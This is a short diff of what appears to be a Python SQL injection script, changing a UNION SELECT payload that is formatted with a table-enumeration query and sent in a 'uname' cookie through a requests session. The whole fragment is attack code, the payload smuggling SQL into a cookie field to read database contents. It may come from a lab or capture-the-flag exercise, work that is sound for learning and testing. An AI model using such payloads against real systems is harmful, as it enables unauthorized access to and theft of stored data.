@@ -8,7 +8,7 @@ session = requests.Session()
 
 
 
-payload = "' union select 1,{},3#"
+payload = "' union select 5,{},3#"
 
 
 cookies = {"uname": payload.format(get_table)}
